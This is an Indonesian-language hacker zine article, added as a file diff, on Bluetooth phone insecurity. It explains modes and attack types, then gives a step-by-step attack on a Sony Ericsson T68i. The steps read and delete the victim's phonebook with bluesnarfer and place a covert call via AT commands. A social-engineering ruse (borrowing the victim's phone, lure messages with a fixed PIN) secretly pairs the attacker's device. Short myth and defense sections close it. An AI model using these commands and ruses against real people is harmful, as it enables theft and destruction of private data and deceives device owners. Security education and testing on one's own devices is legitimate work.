@@ -1,0 +1,473 @@
+
+
+                        echo|zine, volume 4 issue 15
+
+----------------------[ 101 A Bluetooth [in]Security ]--------------------
+--------------------------------------------------------------------------
+--------------------[ y3dips <http y3dips echo or id> ]-------------------
+
+
+---// 	Pengantar 
+
+Bluetooth adalah salah satu teknologi pengganti kabel yang mengkonsumsi 
+sedikit tenaga listrik, memiliki harga yang relatif murah, berjarak relatif 
+pendek (10-100m), dan dapat digunakan untuk pertukaran data dan suara.
+
+Riset tentang teknologi "bluetooth" yang telah dilakukan oleh ericsson(tm)
+pada tahun 1998 telah memberikan dampak yang cukup besar pada teknologi 
+"pengganti kabel" atau yang lebih sering aku kenal dengan "wireless technology".
+Riset ini Kemudian dilanjutkan oleh sebuah grup yang menamakan dirinya 
+Special Interest Group dengan "codename" bluetooth dan telah di dukung oleh 
+banyak perusahaan besar yang berkepentingan dengan teknologi ini. Sehingga 
+pada tahun 1999 dikeluarkanlah versi pertama (bluetooth ver 1.0) dan versi
+yang sekarang digunakan adalah versi 2.0 (merupakan ver 1.2 ditambah EDR).
+
+Teknologi bluetooth sampai saat ini tetap dipakai dan di kembangkan pada
+kurang lebih 856 produk[3].
+
+---//	Why attacking bluetooth ?
+
+	1. Bluetooth dipakai pada peralatan pribadi yang umumnya menyimpan
+	   informasi penting yang bersifat pribadi juga dan menjadikannya
+	   sebagai target yang berharga bagi penyerang
+
+	2. Untuk menyerang device bluetooh penyerang tidak perlu untuk melewati
+	   Lapisan firewall, policy, third party security application, IDS/IPS.
+
+	3. Bisa ditemukan dibanyak tempat di karenakan layanan ini di pakai
+	   dibanyak "device".
+
+---//  	Technical Details
+
+	- Menggunakan frekuensi 2,4GHz 
+	  - 79 channel, dengan lompatan frekuensi 1600 hops/second
+	- Menggunakan "single chip radio" sehingga harganya relatif murah
+	- Memiliki "range" 10-100 Meter
+	- Menggunakan 2.5 mW
+	- Memiliki Data Rate 1Mbps
+
+---// 	Bluetooth Mode
+
+-------[ 1. Service mode 
+
+	a. mode menyala ("on" mode )
+	Untuk mode "on" terdapat mode "discoverable" dan "un-discoverable",
+	dimana pada saat discoverable "device" akan dapat dan untuk di temukan 
+	oleh "device" lain. Sedangkan un-discoverable mode mengakibatkan
+	secara umum tidak dapat di temukan oleh "device" lain.
+	
+	b. mode tidak menyala ( "off" mode )
+	Layanan bluetooth mati pada mode ini
+	
+	c. mode otomatis ( "automatic" mode )
+	Layanan ini akan memudahkan aplikasi untuk menggunakan layanan bluetooth
+
+-------[ 2. Security mode
+
+	a. Security mode level 1
+	Tidak ada mode sekuriti sama sekali
+
+	b. Security mode level 2
+	Sekuriti terdapat pada level "service", tetapi pada level "device"
+	tidak ada terdapat.	
+
+	c. Security mode level 3
+
+	Sekuriti terdapat pada level "device" dan menerapkan sekuriti pada
+	setiap level yang lebih rendah.
+
+---// 	Bluetooth Security threat
+
+-------[ 1. Bluejacking 
+
+	Teknik ini dilakukan dengan cara mengirimkan pesan/gambar/nomer 
+	telpon tanpa ijin kepada target, tujuannya adalah mulai dari perbuatan 
+ 	iseng sampai pada "social engineering" untuk memancing target melakukan
+	pairing kepada "device" penyerang.
+
+-------[ 2. Bluesnarfing
+
+	Teknik ini mengijinkan penyerang untuk terhubung ke "device" milik
+	target tanpa diketahui pemiliknya dan akan mengakibatkan penyerang
+	dapat mengakses data data penting yang tersimpan didalam "device" target
+	seperti daftar nomer telepon (buku telepon), "business card", "images"
+	bahkan IMEI (International Mobile Equipment Identity ) yang dapat 
+	mengakibatkan nomer tersebut untuk di "clonning".	
+
+-------[ 3. BlueBugging
+
+	Teknik ini mengakibatkan "device" target dan penyerang terhubung secara
+	serial dan mengakibatkan penyerang memiliki kendali penuh terhadap 
+	"device" target sehingga penyerang juga dapat mengeksekusi set perintah AT
+	(ASCII Terminal) diantaranya untuk melakukan panggilan, mengirim dan 
+	membaca SMS, melakukan koneksi jaringan bahkan internet melalui "device" 
+	target sampai kepada "identity theft".
+	
+-------[ 4. BlueSmack
+
+	Teknik ini melakukan serangan Denial Of Service terhadap device target, salah
+	satu caranya adalah memanfaatkan perintah l2ping pada protokol L2CAP. 
+
+-------[ 5. Backdoor Attack
+
+	Teknik ini adalah dengan memanfaatkan "pairing" yang telah tercipta antara
+	"device" target dan penyerang. Memanfaatkan Kelengahan Target dan Teknik
+	social engineering. 
+
+
+---// 	Basic Penetration
+
+Berikut akan aku lakukan penetrasi mendasar terhadap bluetooth sekuriti,
+dengan harapan akan memberikan pemahaman mendalam tentang ini.
+
+-------[ 0. Info 
+
+Target     : Mobile phone Sony ericsson t68i
+Penyerang  : Toshiba tecra 8100
+	     Linux Ubuntu 5.10 Operating system
+	     USB bluetooth dongle with Bluez
+	     
+Tools	   : Bluesnarfer
+	     Bluez-utils
+	     RedFang
+
+-------[ 1. Preparation
+
+Sekarang lakukan checking terhadap bluetooth device (USB dongle) menggunakan
+hciconfig (packet Bluez)
+
+//--- command ----//
+
+y3dips@hogwartz:~$ hciconfig -a hci0
+hci0:   Type: USB
+        BD Address: 00:09:DD:10:4E:B1 ACL MTU: 192:8 SCO MTU: 64:8
+        UP RUNNING PSCAN ISCAN
+        RX bytes:394 acl:0 sco:0 events:18 errors:0
+        TX bytes:319 acl:0 sco:0 commands:17 errors:0
+        Features: 0xff 0xff 0x0f 0x00 0x00 0x00 0x00 0x00
+        Packet type: DM1 DM3 DM5 DH1 DH3 DH5 HV1 HV2 HV3
+        Link policy: RSWITCH HOLD SNIFF PARK
+        Link mode: SLAVE ACCEPT
+        Name: 'hogwartz-0'
+        Class: 0x3e0100
+        Service Classes: Networking, Rendering, Capturing
+        "device" Class: Computer, Uncategorized
+        HCI Ver: 1.1 (0x1) HCI Rev: 0x460 LMP Ver: 1.1 (0x1) LMP Subver: 0x460
+        Manufacturer: Cambridge Silicon Radio (10)
+
+//--- command ----//
+
+didapatkan beberapa informasi penting, diantaranya:
+	1. Type: USB
+	2. BD Address: 00:09:DD:10:4E:B1 
+	3. Service Classes: Networking, Rendering, Capturing
+
+Baiklah, ternyata "device" berjalan baik dan dikenali oleh system.
+
+-------[ 2. Scanning
+
+Setelah semua persiapan berjalan dengan baik maka selanjutnya adalah menemukan 
+target, untuk mendeteksi layanan bluetooth yang aktif (mode menyala) dan 
+juga "discoverable", aku hanya menggunakan hcitool (paket Bluez)
+
+//--- command ----//
+
+y3dips@hogwartz:~$ hcitool scan
+Scanning ...
+        00:0A:D9:49:B6:8B       T68i
+	00:0C:55:FF:F3:B6       heaven-0
+	00:D5:F9:33:B6:A4       dodlesvck
+	00:60:57:44:56:B3       6310i	
+
+//--- command ----//
+
+Yupe, aku menemukan ada 4 buah "device"yang mengaktifkan layanan bluetoothnya.
+dan aku putuskan untuk bereksplorasi satu persatu, untuk itu aku putuskan 
+akan melakukan penetrasi sesuai urutan :)
+
+Selanjutnya adalah melakukan perkenalan lebih jauh dengan "device" tersebut,
+dan untuk ini digunakanlah sdptool (paket bluez) untuk melakukan browsing
+dan secara spesifik aku tambahkan options "grep" khusus untuk menemukan 
+service apa saja yang di layani oleh "device" tersebut, "device" akan di kenali
+dengan alamat bluetooth.
+
+dalam hal ini untuk "device" pertama adalah 00:0A:D9:49:B6:8B
+
+//--- command ----//
+
+y3dips@hogwartz:~$ sdptool browse 00:0A:D9:49:B6:8B | grep Service\ Name
+Service Name: Dial-up Networking
+Service Name: Fax
+Service Name: Voice gateway
+Service Name: Serial Port 1
+Service Name: Serial Port 2
+Service Name: OBEX Object Push
+Service Name: IrMC Synchronization
+Service Name: Voice gateway
+
+//--- command ----//
+
+Dan kita dapatkan bahwa device tersebut memberikan service Dial-up Networking,
+Fax, Voice Gateway, Serial Port, OBEX, IrMC.
+
+Untuk melakukan cek hubungan dengan device maka kita dapat melakukan ping.
+
+//--- command ----//
+
+y3dips@hogwartz:~$ sudo l2ping 00:0A:D9:49:B6:8B
+Ping: 00:0A:D9:49:B6:8B from 00:09:DD:10:4E:B1 (data size 44) ...
+0 bytes from 00:0A:D9:49:B6:8B id 0 time 46.69ms
+0 bytes from 00:0A:D9:49:B6:8B id 1 time 31.24ms
+0 bytes from 00:0A:D9:49:B6:8B id 2 time 37.95ms
+0 bytes from 00:0A:D9:49:B6:8B id 3 time 33.01ms
+0 bytes from 00:0A:D9:49:B6:8B id 4 time 48.04ms
+5 sent, 5 received, 0% loss
+
+//--- command ----//
+
+-------[ 3. Owning
+
+Setelah melakukan Scanning dan mendapatkan alamat target dan informasi
+mengenai service yang dilayani oleh device tersebut maka selanjutnya kita 
+akan melakukan "snarfing" terhadap bluetooth device (Bluesnarfing).
+
+Salah satu erangan yang mungkin adalah membaca buku telepon dari device
+dengan menggunakan bluesnarfer.
+
+//--- command ----//
+
+y3dips@hogwartz:~/bt/snarf$ sudo ./bluesnarfer -b 00:0A:D9:49:B6:8B -r 1-10
+"device" name: T68i
++  1 - My Sephia /M : 08883535266
++  3 - Mbah Marijan/W : 021454545
++  5 - Osama Laden/W : 662224258
++  7 - Warung Pecel Bu Roso/W : 0214545889
++  9 - Superman/W : 911
+bluesnarfer: release rfcomm ok
+
+//--- command ----//
+
+Selanjutnya kita juga dapat menghapus buku telepon
+
+//--- command ----//
+
+y3dips@hogwartz:~/bt/snarf$ sudo ./bluesnarfer -b 00:0A:D9:49:B6:8B -w 1-10
+"device" name: T68i
+delete of entry 1 successfull
+delete of entry 2 successfull
+delete of entry 3 successfull
+delete of entry 4 successfull
+delete of entry 5 successfull
+delete of entry 6 successfull
+delete of entry 7 successfull
+delete of entry 8 successfull
+delete of entry 9 successfull
+delete of entry 10 successfull
+bluesnarfer: release rfcomm ok
+
+memeriksa apakah sudah terhapus
+
+y3dips@hogwartz:~/bt/snarf$ sudo ./bluesnarfer -b 00:0A:D9:49:B6:8B -r 1-10
+"device" name: T68i
+bluesnarfer: release rfcomm ok
+
+//--- command ----//
+
+Selain itu aku akan mencoba melakukan Bluebugging dengan cara mengeksekusi 
+perintah AT, dalam hal ini ATD (melakukan panggilan)
+
+//--- command ----//
+
+y3dips@hogwartz:~/bt/snarf$ sudo ./bluesnarfer -b 00:0A:D9:49:B6:8B -c 'ATD555;'
+"device" name: T68i
+custum cmd selected, raw output
+OK
+bluesnarfer: release rfcomm ok
+y3dips@hogwartz:~/Desktop/bluetooth/pentest/snarf$
+
+//--- command ----//
+
+Tapi ingat, dengan melakukan panggilan ini maka akan tampak pada layar target
+bahwa sednag melakukan panggilan terhadap nomer tertentu. (Sehingga sebaiknya
+dalam melakukan panggilan pada saat target tidak berinteraksi langsung dengan 
+device)
+
+---// 	31337 penetration
+
+-------[ 1. Backdooring
+
+Teknik Backdooring ini bisa dilakukan dengan cara berinteraksi secara langsung 
+ataupun tidak, teknik ini bertujuan membuat "device" target melakukan "pairing" 
+dengan device penyerang.
+
+Social enggineering berperanan penting pada teknik ini.
+
+Example
+
+	a. Berinteraksi langsung
+
+	Seperti teknik social engineering yang pada umumnya dilakukan adalah 
+	dengan cara berinteraksi secara langsung dengan device target.
+
+	real life example:
+
+	Ingat, perubahan kartu SIM, menghidupkan dan mematikan Device tidak 
+	menghapus pairing yang telah terbuat, celah ini membuat aku berpura-pura
+	kehabisan batere handphone dan meminjam handphone target untuk mengirim 
+	sms, agar target semakin yakin maka aku gunakan nomer yang aku miliki
+	(agar lebih meyakinkan lagi maka sebiknya handphone kamu emang tidak
+	bisa menyala), setelah itu cobalah lakukan pairing kedevice kamu, sebelum
+	itu ada 2 hal yang harus aku lakukan
+
+		1. menentukan PIN untuk diisikan dari handphone target
+  		
+		//--- command ----//
+		root@hogwartz:~# echo "4321" > /etc/bluetooth/pin
+		//--- command ----//
+
+
+		2. Dan kamu perlu membaca syslog untuk mengetahui alamat target
+		yang terhubung.
+	
+		//--- command ----//
+		root@hogwartz:~# tail -f /var/log/syslog | grep hcid
+		Aug 21 20:25:30 localhost hcid[8880]: pin_code_request \
+		(sba=00:09:DD:10:4E:B1, dba=00:0A:D9:49:B6:8B)
+		//--- command ----//
+
+	ya, dan sekarang aku tinggal matikan handphone dan tukar kartu SIM kembali,
+	selanjutnya tinggal bereksplorasi di "device" target.	
+
+	b. Berinteraksi Tidak langsung
+
+	Cara kedua ini dikombinasikan dengan teknik BlueJacking, pada cara ini
+	aku hanya perlu mengirimkan gambar/text/lagu/ atau apapun ke device 
+	target sehingga target akan melakukan cek terhadap info device pengirim
+	yang tampil pada "device" target dan jika target berniat menerima
+	gambar/text/lagu/ tersebut maka dia harus melakukan pairing dan perlu 
+	memasukan sebaris PIN.
+
+	(nama device; yang bisa di definisikan pada deviceku), Karena karakter
+	di beberapa "device", jumlah karakter tidak dibatasi maka memungkinkan
+	kita untuk menuliskan sebaris kalimat yang "membujuk" (inti social
+	engineering) seperti "FOTO NADINE NIH?" atau "UNTUK MENERIMA KETIKKAN
+	4321"
+
+	Selanjutnya tinggal tunggu hasil pairing kita :).
+	
+
+-------[ 2. Detecting the undetected
+
+Baiklah, sekarang bagaimana kalau "device" tersebut tidak di set discoverable
+sehingga aku akan kesulitan mendapatkan alamat device, dan aku pun tidak mungkin 
+meminjam handphone ("device") target karena satu dan lain hal (pelit mungkin:P).
+
+Beruntunglah aku dikarenakan ada satu tools yang dipublikasikan dengan nama
+"redfang" dan mampu mendeteksi "device" bluetooth yang menyalakan layanannya
+tetapi tidak di set discoverable.
+
+//--- command ----//
+
+y3dips@hogwartz:~/bt/fang$ sudo ./redfang -r 000AD949B689-000AD949B68D
+redfang - the bluetooth hunter ver 2.5
+(c)2003 @stake Inc
+author:   Ollie Whitehouse <ollie@atstake.com>
+enhanced: threads by Simon Halsall <s.halsall@eris.qinetiq.com>
+enhanced: "device" info discovery by Stephen Kapp <skapp@atstake.com>
+Scanning 5 address(es)
+Address range 00:0a:d9:49:b6:89 -> 00:0a:d9:49:b6:8d
+Found: T68i  [00:0a:d9:49:b6:8b]
+Getting "device" Information.. Failed.
+
+//--- command ----//
+
+Dan akupun mendapatkan alamat target. :), salah satu kelemahannya adalah
+kecepatannya dalam menemukan adalah sangat lambat, aku sering menggunakan
+options "-t" untuk meningkatkan waktu timeout dan mempercepat scanning.
+atau bisa melakukan "recursive execute". (automated ? -- in proggress)
+
+
+---// 	Mitos dalam "bluetooth [in]security"
+
+[1] Matikan saja layanan Bluetoothnya niscaya akan aman
+	
+	Mematikan layanan bluetooth ("off" mode) pada "device" tidaklah 100%
+	akan membuat "device" aman. Serangan yang  mungkin dilakukan adalah
+	Social engginering dan Malicious program (virus, worm & trojan) 
+	yang dapat secara otomatis menyalakan layanan bluetooh ("on" mode)
+	atau bahkan melakukan pairing/backdoor attack ke bluetooth "device".
+
+	Jadi perkuat device anda dengan firewall dan juga antivirus
+
+[2] Di Buat "[un]discoverable" akan aman
+
+	Lihat sub-chapter "31337 penetration" pada bagian kedua "Detecting 
+	the undetected"
+
+[3] Tidak ada informasi penting di bluetooth "device"
+
+	Salah, ambil contoh "mobile "device" (phone, smart phone, laptop)"
+	Hampir seluruh data penting tersimpan, misalkan mobile phone, disana 
+	terdapat seluruh nomer nomer yang penting bagi anda meskipun anda
+	tidak termasuk orang penting :P. 
+
+[4] Jaraknya pendek
+	
+	Jarak bluetooth device umumnya pendek 10-100 Meter, tetapi dengan 
+	adanya teknik untuk memperkuat signal[6] maka jangkauan pun bisa
+	di perjauh bahkan sampai 1 km.
+
+[5] Penyerangnya pasti akan tampak "aneh" dan "mencurigakan" [karena membawa
+    -bawa laptop dan bluetooth device yang di modifikasi (perkuat sinyal)?]
+	
+	Tidak juga, bahkan sekarang via mobile phone/PDA (java supported) 
+	bisa melakukan "assessment"[2].
+
+---// 	Bertahan ? 
+
+[1] Update informasi anda tentang "device" anda (khususnya soal security) 
+[2] Update Frimware anda, jikalau termasuk "device" yang di curigai
+[3] Periksa daftar "trusted Pair", hapus yang sudah tidak dibutuhkan, hindari
+    backdoor attack
+[4] Gunakan Fitur keamanan tambahan (eg: Antivirus, Firewall)
+[5] Untuk meminimalisir serangan matikan layanan bluetooth anda jika tidak
+    digunakan
+[6] Jikapun dibutuhkan, buatlah PIN yang relatif kuat.
+[7] Pastikan untuk tidak sembarangan melakukan koneksi/pairing (eg: terima
+    file dari "unknown device")
+
+
+---//   Clue 	
+
+	Sebagian handphone memiliki celah terserang teknik bluesnarfing ataupun 
+	bluebug saat visible (discoverable) dan sebagian lainnya non-visible 
+        (non-discoverable), sementara beberapa jenis lainnya tidak vulnerable 
+        kecuali dengan menggunakan backdoor attack dan teknik  bluejacking 
+	(Social engineering) 
+
+---//   Kamus
+
+	Pairing adalah suatu bagian (state) yang dilakukan apabila dua buah 
+	"device" setuju untuk berkomunikasi satu sama lainnya, setelah state
+	ini terjadi maka apabila ingin terjadi komunikasi ulang maka akan
+	membypass proses pencarian (discovery) dan otentikasi (authentication)
+	yang biasa terjadi pada saat interaksi.
+
+---// 	Referensi
+	
+	[1] y3dips, "Owned a mobile "device" via bluetooth", dipresentasikan dan 
+            didemokan pada "Cryptography and Wireless security seminar", 2006
+	[2] Trifinite official site`s. http://trifinite.org
+	[3] SIG. http://bluetooth.org
+	[4] http://thebunker.net
+	[5] wikipedia. http://en.wikipedia.org
+	[6] bluesniper. http://www.tomsnetworking.com/2005/03/08/how_to_bluesniper_pt1/
+	
+---// 	Greetz 
+	
+	my lovely "ana"
+	echo|staff, echo|members
+	all Indonesian Security Groups
+	you! ... oh yes, you .. who read the rest of this article`s
+
+	
